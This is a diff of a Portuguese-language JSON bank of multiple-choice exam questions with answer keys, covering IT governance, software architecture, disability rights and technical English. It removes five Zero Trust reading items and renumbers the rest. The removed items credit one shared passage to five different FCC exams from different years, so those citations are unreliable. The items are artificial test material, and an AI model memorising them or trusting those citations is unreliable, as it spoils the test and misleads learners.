@@ -11341,96 +11341,6 @@
   },
   {
     "id": 631,
-    "day_id": "dia_02_06",
-    "day_title": "Dia 02/06",
-    "theme": "Inglês Técnico",
-    "context": "### Texto para as questões 46 a 50\n**Zero Trust Architecture in Modern IT**\n\nHistorically, IT departments relied on a perimeter security model. This traditional approach assumes that everything on the inside of an organization's network can be trusted. However, this model is fundamentally flawed because once an attacker breaches the perimeter, they have free rein to move laterally throughout the internal network. \n\nZero Trust is a security framework requiring all users, whether in or outside the organization's network, to be authenticated, authorized, and continuously validated for security configuration and posture before being granted or keeping access to applications and data. **It** operates on the principle of \"never trust, always verify.\" \n\nBy implementing Zero Trust, organizations can prevent unauthorized access, contain breaches, and reduce the risk of an attacker's lateral movement.",
-    "source": "FCC - 2018 - TRT 15ª Região - Analista Judiciário - Tecnologia da Informação",
-    "statement": "According to the text, what is the main flaw of the traditional perimeter security model?",
-    "options": {
-      "A": "It requires users to be authenticated constantly, which slows down productivity.",
-      "B": "It allows attackers to move freely within the network once the outer defenses are compromised.",
-      "C": "It prevents lateral movement, making it hard for employees to share files.",
-      "D": "It relies entirely on cloud computing infrastructures that are inherently insecure.",
-      "E": "It assumes that users outside the organization's network can be trusted without validation."
-    },
-    "answer": "B",
-    "explanation": "- A) Incorreta. Isso é uma característica (mal interpretada) do Zero Trust, não do modelo de perímetro.\n- B) Correta. O texto afirma: \"...this model is fundamentally flawed because once an attacker breaches the perimeter, they have free rein to move laterally throughout the internal network.\" (uma vez que o atacante rompe o perímetro, ele tem passe livre para se mover lateralmente na rede interna).\n- C) Incorreta. O modelo falha justamente por NÃO prevenir o movimento lateral.\n- D) Incorreta. O texto não menciona cloud computing como a causa da falha.\n- E) Incorreta. O modelo tradicional confia no que está DENTRO (\"inside\") da rede, não fora (\"outside\")."
-  },
-  {
-    "id": 632,
-    "day_id": "dia_02_06",
-    "day_title": "Dia 02/06",
-    "theme": "Inglês Técnico",
-    "context": "### Texto para as questões 46 a 50\n**Zero Trust Architecture in Modern IT**\n\nHistorically, IT departments relied on a perimeter security model. This traditional approach assumes that everything on the inside of an organization's network can be trusted. However, this model is fundamentally flawed because once an attacker breaches the perimeter, they have free rein to move laterally throughout the internal network. \n\nZero Trust is a security framework requiring all users, whether in or outside the organization's network, to be authenticated, authorized, and continuously validated for security configuration and posture before being granted or keeping access to applications and data. **It** operates on the principle of \"never trust, always verify.\" \n\nBy implementing Zero Trust, organizations can prevent unauthorized access, contain breaches, and reduce the risk of an attacker's lateral movement.",
-    "source": "FCC - 2021 - DPE-RR - Analista de Sistemas",
-    "statement": "In the second paragraph, the bolded pronoun \"**It**\" in the sentence \"*It operates on the principle of 'never trust, always verify.'*\" refers to:",
-    "options": {
-      "A": "An attacker.",
-      "B": "The organization's network.",
-      "C": "Security configuration.",
-      "D": "Zero Trust.",
-      "E": "The traditional approach."
-    },
-    "answer": "D",
-    "explanation": "- A FCC frequentemente cobra referência pronominal. Para encontrar a resposta, lemos a frase anterior: \"Zero Trust is a security framework requiring all users...\". O pronome \"It\" atua como sujeito da frase seguinte, substituindo o sujeito principal do contexto recém-apresentado, que é o modelo \"Zero Trust\".\n- A, B, C e E estão incorretas pois não se alinham semanticamente e gramaticalmente ao conceito que \"opera sob o princípio de nunca confiar, sempre verificar\"."
-  },
-  {
-    "id": 633,
-    "day_id": "dia_02_06",
-    "day_title": "Dia 02/06",
-    "theme": "Inglês Técnico",
-    "context": "### Texto para as questões 46 a 50\n**Zero Trust Architecture in Modern IT**\n\nHistorically, IT departments relied on a perimeter security model. This traditional approach assumes that everything on the inside of an organization's network can be trusted. However, this model is fundamentally flawed because once an attacker breaches the perimeter, they have free rein to move laterally throughout the internal network. \n\nZero Trust is a security framework requiring all users, whether in or outside the organization's network, to be authenticated, authorized, and continuously validated for security configuration and posture before being granted or keeping access to applications and data. **It** operates on the principle of \"never trust, always verify.\" \n\nBy implementing Zero Trust, organizations can prevent unauthorized access, contain breaches, and reduce the risk of an attacker's lateral movement.",
-    "source": "FCC - 2019 - TRF 3ª Região - Analista Judiciário - Informática",
-    "statement": "Based on the principles described in the text, which of the following is an action aligned with the Zero Trust framework?",
-    "options": {
-      "A": "Granting lifetime network access to an employee after their first login.",
-      "B": "Removing password requirements for users physically present in the main office.",
-      "C": "Continuously validating a user's security posture even after they have already logged in.",
-      "D": "Focusing all security investments exclusively on the outer firewall defenses.",
-      "E": "Trusting any device that is connected to the company's internal Wi-Fi."
-    },
-    "answer": "C",
-    "explanation": "- A) Incorreta. O acesso vitalício após um login quebra a regra de \"validação contínua\".\n- B) Incorreta. A presença física dentro do escritório (perímetro interno) não concede confiança no modelo Zero Trust.\n- C) Correta. O texto diz: \"...continuously validated for security configuration and posture before being granted or keeping access...\".\n- D) Incorreta. Focar só na borda (firewall) é a definição do modelo tradicional.\n- E) Incorreta. Conectar-se no Wi-Fi interno não garante confiança no Zero Trust."
-  },
-  {
-    "id": 634,
-    "day_id": "dia_02_06",
-    "day_title": "Dia 02/06",
-    "theme": "Inglês Técnico",
-    "context": "### Texto para as questões 46 a 50\n**Zero Trust Architecture in Modern IT**\n\nHistorically, IT departments relied on a perimeter security model. This traditional approach assumes that everything on the inside of an organization's network can be trusted. However, this model is fundamentally flawed because once an attacker breaches the perimeter, they have free rein to move laterally throughout the internal network. \n\nZero Trust is a security framework requiring all users, whether in or outside the organization's network, to be authenticated, authorized, and continuously validated for security configuration and posture before being granted or keeping access to applications and data. **It** operates on the principle of \"never trust, always verify.\" \n\nBy implementing Zero Trust, organizations can prevent unauthorized access, contain breaches, and reduce the risk of an attacker's lateral movement.",
-    "source": "FCC - 2023 - TRT 18ª Região - Técnico Judiciário",
-    "statement": "The word \"**breaches**\" in the sentence \"...contain breaches, and reduce the risk...\" (last paragraph) is closest in meaning to:",
-    "options": {
-      "A": "Agreements.",
-      "B": "Upgrades.",
-      "C": "Connections.",
-      "D": "Violations or intrusions.",
-      "E": "Investments."
-    },
-    "answer": "D",
-    "explanation": "- No vocabulário técnico de TI e segurança, a palavra *breach* (ou *data breach*) significa brecha, violação, intrusão ou vazamento de dados. \n- A) Agreements = Acordos.\n- B) Upgrades = Atualizações.\n- C) Connections = Conexões.\n- D) Violations or intrusions = Violações ou intrusões (Correta).\n- E) Investments = Investimentos."
-  },
-  {
-    "id": 635,
-    "day_id": "dia_02_06",
-    "day_title": "Dia 02/06",
-    "theme": "Inglês Técnico",
-    "context": "### Texto para as questões 46 a 50\n**Zero Trust Architecture in Modern IT**\n\nHistorically, IT departments relied on a perimeter security model. This traditional approach assumes that everything on the inside of an organization's network can be trusted. However, this model is fundamentally flawed because once an attacker breaches the perimeter, they have free rein to move laterally throughout the internal network. \n\nZero Trust is a security framework requiring all users, whether in or outside the organization's network, to be authenticated, authorized, and continuously validated for security configuration and posture before being granted or keeping access to applications and data. **It** operates on the principle of \"never trust, always verify.\" \n\nBy implementing Zero Trust, organizations can prevent unauthorized access, contain breaches, and reduce the risk of an attacker's lateral movement.",
-    "source": "FCC - 2017 - TRE-SP - Analista Judiciário - Programação de Sistemas",
-    "statement": "Which of the following sentences correctly expresses the meaning of the phrase \"*have free rein*\" found in the first paragraph?",
-    "options": {
-      "A": "Be completely restricted and monitored.",
-      "B": "Have to pay a fee to access data.",
-      "C": "Experience frequent network disconnections.",
-      "D": "Have the freedom to act or move without limitations.",
-      "E": "Be caught immediately by the security systems."
-    },
-    "answer": "D",
-    "explanation": "- A expressão idiomática \"free rein\" tem origem no controle das rédeas (reins) de um cavalo. Dar \"rédea solta\" (free rein) significa dar liberdade total para agir ou se mover sem restrições. No contexto do texto, se o invasor passa o firewall (perímetro), ele tem liberdade total (\"free rein\") para acessar as máquinas internas. \n- Logo, a alternativa D (\"ter liberdade para agir ou se mover sem limitações\") é a única que reflete o sentido correto."
-  },
-  {
-    "id": 636,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11448,7 +11358,7 @@
     "explanation": "- C) Correta. Otimização de taxa (Rate) no FinOps refere-se a pagar menos pelo mesmo recurso (ex: descontos por comprometimento, como Reserved Instances ou Savings Plans). Desligar máquinas é Otimização de Uso (Usage Optimization). Refatorar arquitetura leva tempo e não é apenas otimização de taxa financeira."
   },
   {
-    "id": 637,
+    "id": 632,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11466,7 +11376,7 @@
     "explanation": "- D) Correta. O princípio 'Otimize e automatize' do ITIL v4 afirma explicitamente que NUNCA se deve automatizar um processo falho ou ineficiente. A regra de ouro é primeiro simplificar e otimizar o fluxo de trabalho (tirar o papel, definir aprovação digital) e SÓ ENTÃO aplicar a automação da tecnologia."
   },
   {
-    "id": 638,
+    "id": 633,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11484,7 +11394,7 @@
     "explanation": "- C) Correta. A cascata do COBIT 2019 funciona assim: Necessidades das Partes Interessadas -> traduzidas em Enterprise Goals (Objetivos Corporativos) -> que se desdobram em Alignment Goals (Objetivos de Alinhamento de TI) -> que definem os Governance/Management Objectives."
   },
   {
-    "id": 639,
+    "id": 634,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11502,7 +11412,7 @@
     "explanation": "- A) Correta. O ciclo de vida do FinOps tem 3 fases: Inform (visibilidade, alocação de custos, dashboards), Optimize (Rightsizing, RIs) e Operate (automação contínua, governança e mudança cultural)."
   },
   {
-    "id": 640,
+    "id": 635,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11520,7 +11430,7 @@
     "explanation": "- C) Correta. No ITIL, 'Incidente' é resolvido devolvendo o serviço ao usuário rapidamente, mesmo que com 'remendos' (workarounds). A busca e correção definitiva da causa raiz é responsabilidade de outra prática: o 'Gerenciamento de Problemas' (Problem Management)."
   },
   {
-    "id": 641,
+    "id": 636,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11538,7 +11448,7 @@
     "explanation": "- C) Correta. Os Design Factors do COBIT 2019 servem exatamente para isso: um banco digital ágil dará peso à inovação, enquanto uma agência governamental rígida dará peso à gestão de Risco, Segurança e Monitoramento de Conformidade (APO12, APO13)."
   },
   {
-    "id": 642,
+    "id": 637,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11556,7 +11466,7 @@
     "explanation": "- D) Correta. Requisições de Serviço tratam de ações pré-aprovadas, rotineiras, de baixo risco e previsíveis (como pedir um mouse, resetar senha, liberar acesso a pasta). As outras alternativas representam Incidentes, Problemas ou Mudanças maiores."
   },
   {
-    "id": 643,
+    "id": 638,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11574,7 +11484,7 @@
     "explanation": "- B) Correta. A fundação de qualquer alocação de custos (Chargeback/Showback) na nuvem é a Taggeamento (Tagging) rigoroso de todos os recursos com chaves como Centro de Custo, Projeto e Ambiente."
   },
   {
-    "id": 644,
+    "id": 639,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11592,7 +11502,7 @@
     "explanation": "- B) Correta. O Service Configuration Management foca no CMDB e nas relações/dependências lógicas entre os serviços e CIs. O Gerenciamento de Ativos (A) foca mais no valor financeiro, licenças e ciclo de vida do hardware/software."
   },
   {
-    "id": 645,
+    "id": 640,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11610,7 +11520,7 @@
     "explanation": "- E) Correta. O COBIT é agnóstico em relação à tecnologia de baixo nível. Seus 7 componentes são: Processos; Estruturas Organizacionais; Princípios/Políticas; Informação; Cultura/Comportamento; Pessoas/Habilidades; e Serviços/Infraestrutura/Aplicações."
   },
   {
-    "id": 646,
+    "id": 641,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11628,7 +11538,7 @@
     "explanation": "- C) Correta. Mudanças emergenciais devem ser implementadas o mais rápido possível para resolver incidentes graves (ou ameaças de segurança), e seu fluxo de autorização é acelerado (ex: ECAB - Comitê de Mudança de Emergência)."
   },
   {
-    "id": 647,
+    "id": 642,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11646,7 +11556,7 @@
     "explanation": "- C) Correta. O COBIT separa estritamente Governança (EDM) da Gestão (APO, BAI, DSS, MEA). A Governança, que Avalia, Dirige e Monitora, é função da alta cúpula, do Conselho de Administração ou órgão governamental equivalente."
   },
   {
-    "id": 648,
+    "id": 643,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11664,7 +11574,7 @@
     "explanation": "- B) Correta. Rightsizing significa analisar o desempenho real do recurso e redimensioná-lo para a menor família/instância possível que ainda atenda à demanda, economizando OPEX sem afetar a performance."
   },
   {
-    "id": 649,
+    "id": 644,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11682,7 +11592,7 @@
     "explanation": "- A) Correta. A Service Value Chain (SVC) é o coração operacional do SVS no ITIL v4, composta pelas 6 atividades centrais iterativas (PIEDOE) usadas para cocriar valor com o cliente."
   },
   {
-    "id": 650,
+    "id": 645,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Governança TI (COBIT 2019, ITIL v4 e FinOps)",
@@ -11700,7 +11610,7 @@
     "explanation": "- B) Correta. A cascata do COBIT mapeia otimização de custo corporativo diretamente para a otimização dos ativos e capacidades de TI (fazer mais com menos, evitar desperdícios em hardware/nuvem)."
   },
   {
-    "id": 651,
+    "id": 646,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11718,7 +11628,7 @@
     "explanation": "- B) Correta. A anotação `@CircuitBreaker` (ex: Resilience4j) implementa o Disjuntor. Ele evita o esgotamento de threads e falha rapidamente ('Fail Fast') quando o serviço remoto está inoperante."
   },
   {
-    "id": 652,
+    "id": 647,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11736,7 +11646,7 @@
     "explanation": "- B) Correta. O padrão Sidecar ('Carro Lateral') permite colocar um container proxy (Envoy, Istio) compartilhando o mesmo namespace/rede do container principal da aplicação, tirando o peso de resolver regras de rede, criptografia (mTLS) e observabilidade do código do dev."
   },
   {
-    "id": 653,
+    "id": 648,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11754,7 +11664,7 @@
     "explanation": "- C) Correta. Na Coreografia, os serviços operam de forma reativa a eventos publico-assinante (Pub/Sub). Não há um 'maestro' central (que seria a Orquestração), os próprios serviços 'dançam no ritmo' dos eventos."
   },
   {
-    "id": 654,
+    "id": 649,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11772,7 +11682,7 @@
     "explanation": "- C) Correta. No DDD, uma Entity tem um ciclo de vida e identidade contínua (ex: `Cliente` com CPF `123`, mesmo que mude o nome, ainda é ele). Value Object não tem ID e é imutável (ex: uma nota de R$ 50 é igual a qualquer outra nota de R$ 50, importam apenas seus atributos)."
   },
   {
-    "id": 655,
+    "id": 650,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11790,7 +11700,7 @@
     "explanation": "- B) Correta. O núcleo nunca depende da infraestrutura externa. O núcleo dita as regras (cria a interface/porta). O detalhe tecnológico (Postgres, Mongo, Arquivo TXT) atua como um Adaptador que preenche a interface. Isso torna o domínio 100% testável com Mocks."
   },
   {
-    "id": 656,
+    "id": 651,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11808,7 +11718,7 @@
     "explanation": "- E) Correta. Idempotência garante que, ao fazer a requisição `DELETE /usuarios/10` uma, dez ou mil vezes, o estado final do servidor será o mesmo (o usuário 10 estará ausente do banco de dados). Os métodos HTTP PUT e DELETE devem ser projetados de forma idempotente."
   },
   {
-    "id": 657,
+    "id": 652,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11826,7 +11736,7 @@
     "explanation": "- B) Correta. O Padrão Strangler Fig intercepta rotas de entrada gradativamente, substituindo o sistema antigo pedaço a pedaço até que ele morra (estrangulado) e seja descartado em segurança."
   },
   {
-    "id": 658,
+    "id": 653,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11844,7 +11754,7 @@
     "explanation": "- C) Correta. Para o app Cloud-native 12-factor, não importa se o MySQL roda localmente no laptop do dev, ou se é um cluster AWS RDS. Ele deve se conectar a ambos da mesma forma técnica via credenciais passadas como recursos anexados (geralmente via Environment Variables)."
   },
   {
-    "id": 659,
+    "id": 654,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11862,7 +11772,7 @@
     "explanation": "- D) Correta. O Backend for Frontend (BFF) cria camadas de serviço personalizadas (agrupamento e filtragem de requisições) dedicadas aos clientes (Mobile vs Desktop) reduzindo o tráfego da rede na ponta do usuário e desacoplando os times de UI."
   },
   {
-    "id": 660,
+    "id": 655,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11880,7 +11790,7 @@
     "explanation": "- B) Correta. No CQRS avançado, o modelo e até o banco de dados de Leitura podem ser completamente diferentes do modelo de Escrita. Se um usuário insere um processo (Command no SQL Relacional), um evento atualiza uma view desnormalizada NoSQL (Query) superotimizada para busca."
   },
   {
-    "id": 661,
+    "id": 656,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11898,7 +11808,7 @@
     "explanation": "- C) Correta. Cloud-native baseia-se pesadamente na Infraestrutura como Código (IaC) e modelos declarativos. Você diz ao K8s o objetivo final (3 réplicas) via YAML, e ele cria/apaga recursos sozinho (Control Loop)."
   },
   {
-    "id": 662,
+    "id": 657,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11916,7 +11826,7 @@
     "explanation": "- C) Correta. Semelhante aos compartimentos estanques de um submarino, o Bulkhead divide recursos (como pools de conexões e threads). Se uma integração com uma API de notas fiscais travar, o sistema esgota apenas aquele pool e o resto do site continua responsivo."
   },
   {
-    "id": 663,
+    "id": 658,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11934,7 +11844,7 @@
     "explanation": "- B) Correta. O Bounded Context cria fronteiras lógicas no modelo de linguagem ubíqua. O microserviço é a fronteira física/técnica. Alinhá-los 1:1 é o 'sweet spot' arquitetural recomendado por especialistas para isolamento de equipes e domínio."
   },
   {
-    "id": 664,
+    "id": 659,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11952,7 +11862,7 @@
     "explanation": "- C) Correta. O Fator 3 (Config) manda armazenar as configurações (credenciais, URLs dinâmicas que mudam entre dev, staging e prod) NO AMBIENTE (variáveis de ambiente), e NÃO hard-coded no código fonte do aplicativo."
   },
   {
-    "id": 665,
+    "id": 660,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Arquitetura de Software (Microserviços, DDD e Cloud-native)",
@@ -11970,7 +11880,7 @@
     "explanation": "- C) Correta. O gRPC usa Protobuf para serializar mensagens de forma binária minúscula e fortemente tipada, e trafega sobre a conexão persistente e multiplexada do HTTP/2, superando largamente a performance do REST em chamadas internas síncronas."
   },
   {
-    "id": 666,
+    "id": 661,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -11988,7 +11898,7 @@
     "explanation": "- B) Correta. O direito de acesso de pessoa com deficiência visual acompanhada de cão-guia é amplo e incondicional (em ambientes de uso coletivo). A única exceção de saúde se aplica a UTIs e ambientes estéreis hospitalares reais. Ambientes de escritório, gabinetes ou CPDs não se enquadram na exceção e normas inferiores não suplantam a lei federal."
   },
   {
-    "id": 667,
+    "id": 662,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12006,7 +11916,7 @@
     "explanation": "- B) Correta. As barreiras tecnológicas devem ser sanadas mediante obediência às cartilhas de acessibilidade W3C (WCAG) e o framework federal e-MAG, garantindo compatibilidade técnica com alto contraste, leitores de tela e atalhos de teclado."
   },
   {
-    "id": 668,
+    "id": 663,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12024,7 +11934,7 @@
     "explanation": "- B) Correta. Barreiras arquitetônicas existem no *interior* dos edifícios e ambientes públicos ou privados (escadas sem rampa/elevador, portas estreitas). As urbanísticas estão nas vias e espaços públicos externos (calçadas esburacadas)."
   },
   {
-    "id": 669,
+    "id": 664,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12042,7 +11952,7 @@
     "explanation": "- C) Correta. O Decreto 5.904/06 explicitamente estende o direito de acesso ao treinador, instrutor e família socializadora do cão em fase de treinamento, visando acostumar o animal aos estímulos de locais de uso coletivo."
   },
   {
-    "id": 670,
+    "id": 665,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12060,7 +11970,7 @@
     "explanation": "- B) Correta. O pluralismo e a representatividade viva (dar voz a quem sofre as barreiras na pele) são os alicerces legais da composição dos Comitês de Acessibilidade no judiciário brasileiro."
   },
   {
-    "id": 671,
+    "id": 666,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12078,7 +11988,7 @@
     "explanation": "- B) Correta. As barreiras atitudinais referem-se a atitudes e comportamentos sociais segregacionistas ou preconceituosos. Excluir o servidor da reunião ativamente ao invés de buscar a adaptação razoável da TI (ativar closed captions) é atitude capacitista e discriminatória."
   },
   {
-    "id": 672,
+    "id": 667,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12096,7 +12006,7 @@
     "explanation": "- C) Correta. É terminantemente proibido cobrar tarifa ou passagem para o cão-guia. O animal deve ser transportado junto ao dono no assoalho do veículo/aeronave em posição confortável."
   },
   {
-    "id": 673,
+    "id": 668,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12114,7 +12024,7 @@
     "explanation": "- D) Correta. A Convenção de Nova Iorque (2006) sobre os direitos da PcD foi o primeiro (e mais importante) tratado internacional aprovado no Congresso com quórum qualificado, tornando-se material e formalmente equivalente a uma Emenda Constitucional."
   },
   {
-    "id": 674,
+    "id": 669,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12132,7 +12042,7 @@
     "explanation": "- B) Correta. O decreto do cão-guia proíbe exigências de uso de focinheiras ou a obrigatoriedade de retirada do arreio/identificação que são essenciais para o guiamento do usuário."
   },
   {
-    "id": 675,
+    "id": 670,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12150,7 +12060,7 @@
     "explanation": "- C) Correta. Atender as diretrizes WCAG engloba fornecer descrições textuais para imagens e ícones (para que cegos ouçam a descrição) e nunca prender o usuário ao uso do mouse (a navegação via 'TAB' no teclado deve ser capaz de preencher toda a petição eletrônica de forma lógica)."
   },
   {
-    "id": 676,
+    "id": 671,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12168,7 +12078,7 @@
     "explanation": "- B) Correta. A lei é baseada em princípios sanitaristas razoáveis. O cão-guia deve portar carteira de vacinação comum (polivalente e antirrábica) válida, carimbada por veterinário. Não se exige quarentena diária ou abusiva."
   },
   {
-    "id": 677,
+    "id": 672,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12186,7 +12096,7 @@
     "explanation": "- B) Correta. O Desenho Universal (Universal Design) não visa criar um 'puxadinho especial para a PCD', mas criar produtos e prédios que sejam inerentemente bons e fáceis de usar para QUALQUER usuário desde o seu esboço/nascimento."
   },
   {
-    "id": 678,
+    "id": 673,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12204,7 +12114,7 @@
     "explanation": "- B) Correta. O poder público tem o dever jurídico (não é favor) de prover a tecnologia assistiva (Libras, leitores de tela) e adaptações razoáveis de infraestrutura comunicacional para garantir o exercício pleno dos direitos dos servidores PcD."
   },
   {
-    "id": 679,
+    "id": 674,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12222,7 +12132,7 @@
     "explanation": "- C) Correta. O direito ao acesso do cão-guia é gratuito por lei federal em estabelecimentos de uso público. Qualquer imposição de caução, taxa extra, ingresso, 'pedágio animal' ou caução preventiva é infração configuradora de discriminação."
   },
   {
-    "id": 680,
+    "id": 675,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Direitos das PCD (CSJT 386/2024 e Cão-guia)",
@@ -12240,7 +12150,7 @@
     "explanation": "- C) Correta. O Comitê de Acessibilidade não é apenas uma roda de conversas, ele é um órgão estratégico interno que influencia o PLS (Plano de Logística Sustentável) e assessora a presidência na aprovação das verbas anuais para executar o plano de melhoria arquitetônica e tecnológica."
   },
   {
-    "id": 681,
+    "id": 676,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Inglês Técnico",
@@ -12258,7 +12168,7 @@
     "explanation": "- D) Correta. A sentença contrasta o monólito legado (legacy monolith) com as arquiteturas de microserviços (microservices architectures) que, ao contrário dos monólitos, permitem que escalem ('they allow independent scaling')."
   },
   {
-    "id": 682,
+    "id": 677,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Inglês Técnico",
@@ -12276,7 +12186,7 @@
     "explanation": "- B) Correta. A expressão idiomática 'from the ground up' significa começar algo desde a base, do zero, desde o princípio."
   },
   {
-    "id": 683,
+    "id": 678,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Inglês Técnico",
@@ -12294,7 +12204,7 @@
     "explanation": "- C) Correta. O texto afirma explicitamente que o padrão Strangler Fig gradualmente encolhe o sistema legado, o que \"minimizes downtime and heavily mitigates deployment risks\" (minimiza a inatividade e reduz os riscos de implantação)."
   },
   {
-    "id": 684,
+    "id": 679,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Inglês Técnico",
@@ -12312,7 +12222,7 @@
     "explanation": "- C) Correta. O texto diz \"gradually shrinking the legacy system by placing a proxy in front of it\". 'It' se refere ao sistema legado ('the legacy system')."
   },
   {
-    "id": 685,
+    "id": 680,
     "day_id": "dia_03_06",
     "day_title": "Quarta-feira 03/06",
     "theme": "Inglês Técnico",
@@ -12328,5 +12238,2165 @@
     },
     "answer": "D",
     "explanation": "- D) Correta. 'Sprawl' significa expansão ou espalhamento sem controle. No contexto, criar microserviços gera dezenas ou centenas de implantações (sprawl de deploys) que seriam difíceis de controlar sem IaC."
+  },
+  {
+    "id": 681,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
